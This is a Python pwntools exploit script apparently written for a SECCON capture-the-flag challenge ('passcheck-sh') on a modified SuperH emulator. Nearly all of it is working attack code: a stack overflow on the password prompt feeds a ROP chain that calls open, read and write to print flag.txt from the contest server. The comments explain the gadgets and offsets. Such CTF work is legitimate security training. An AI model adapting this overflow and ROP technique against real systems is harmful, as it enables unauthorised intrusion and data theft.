#!/usr/bin/env python
# -*- coding: UTF-8 -*-
#
# exploit for passcheck-sh
# note that the binary will not run due to use of a special emulator
#


from pwn import *
from struct import *

# this is on a modified superh architecture
# r15 is stack pointer, pr is like the link register on arm, r8 is frame pointer
# r4 is system call number, r5 is arg1, r5 arg2, r7 arg3

p32l = lambda x: struct.pack(">L", x)

def strow(instr, owstr, offset):
	return instr[:offset] + owstr + instr[offset + len(owstr):]

r = remote('micro.pwn.seccon.jp', 10000)
print r.recvuntil("Input password: ")

# stack overflow reading password, we gain execution on the following "rts" instruction
# we are byte restricted on \n 0x0a and \r 0x0d
# .text:0000424C 67 F6                       mov.l   @r15+, r7       ; Move Long Data
# .text:0000424E 66 F6                       mov.l   @r15+, r6       ; Move Long Data
# .text:00004250 65 F6                       mov.l   @r15+, r5       ; Move Long Data
# .text:00004252 64 F6                       mov.l   @r15+, r4       ; Move Long Data
# .text:00004254 4F 26                       lds.l   @r15+, pr       ; Load to System Register Long
# .text:00004256 00 0B                       rts                     ; Return from Subroutine
# .text:00004258 68 F6                       mov.l   @r15+, r8       ; Move Long Data

buff =  p32l(1) # r7, offset 0
buff += p32l(2) # r6, offset 4
buff += p32l(3) # r5, offset 8
buff += p32l(4) # r4, offset 0xc


# can jump to this address to receive the string "OK. Read flag.txt" as a test of ROP accuracy
# .text:000042A0                 mov.l   #aOk_ReadFlag_tx, r4 ; "OK. Read flag.txt"
# .text:000042A2                 mov.l   #print_string, r0
# .text:000042A4                 jsr     @r0 ; print_string

buff += p32l(0x42a0) # pc, offset 0x10 -- 0x42ec will test the ROP alignment (this is overwritten later)
buff += p32l(8) # r8, offset 0x14

# system call number from https://github.com/torvalds/linux/blob/master/arch/sh/kernel/syscalls_32.S
#	.long sys_restart_syscall	/* 0  -  old "setup()" system call*/
#	.long sys_exit      /* 1 */
#	.long sys_fork      /* 2 */
#	.long sys_read      /* 3 */
#	.long sys_write     /* 4 */
#	.long sys_open		/* 5 */


# we will make system calls using the following ROP
# .text:00004028 D0 02                       mov.l   #service_wrapper, r0 ; Move Immediate Long Data
# .text:0000402A 40 0B                       jsr     @r0 ; service_wrapper ; Jump to Subroutine
# .text:0000402C 00 09                       nop                     ; No Operation
# .text:0000402E 4F 26                       lds.l   @r15+, pr       ; Load to System Register Long
# .text:00004030 00 0B                       rts                     ; Return from Subroutine
# .text:00004032 00 09                       nop                     ; No Operation

# "flag.txt\0" is at 0x4319

# 
# open("flag.txt", 0, 0)
#
buff = strow(buff, p32l(0x4028), 0x10) # replace pc to be system call rop
buff = strow(buff, p32l(5), 0xc) # replace r4 with open sys call number
buff = strow(buff, p32l(0x4319), 8) # replace r5 with pointer to flag.txt
buff = strow(buff, p32l(0), 4) # r6 = 0
buff = strow(buff, p32l(0), 0) # r7 = 0
buff += p32l(0x424c) # setup to regain control over r4-r8, offset 0x18

#
# read(fd, 0xffa010, 50)
#

# hardcode fd to be 0x41 for now

buff += p32l(50) # r7, offset 0x1c, arg3
buff += p32l(0xffa010) # r6, offset 0x20, arg2
buff += p32l(0x41) # r5, offset 0x24, arg1
buff += p32l(3) # r4, offset 0x28, syscall number
buff += p32l(0x4028) # pc, offset 0x2c -- system call rop
buff += p32l(8) # r8, offset 0x30
buff += p32l(0x424c) # setup again to regain control over r4-r8, offset 0x34

#
# write(1, 0xffa010, 50)
#

buff += p32l(50) # r7, offset 0x1c, arg3
buff += p32l(0xffa010) # r6, offset 0x20, arg2
buff += p32l(0x1) # r5, offset 0x24, arg1
buff += p32l(4) # r4, offset 0x28, syscall number
buff += p32l(0x4028) # pc, offset 0x2c -- system call rop
buff += p32l(8) # r8, offset 0x30
buff += p32l(0x42a0) # setup again to regain control over r4-r8

r.sendline(buff)
print r.recv(1024)
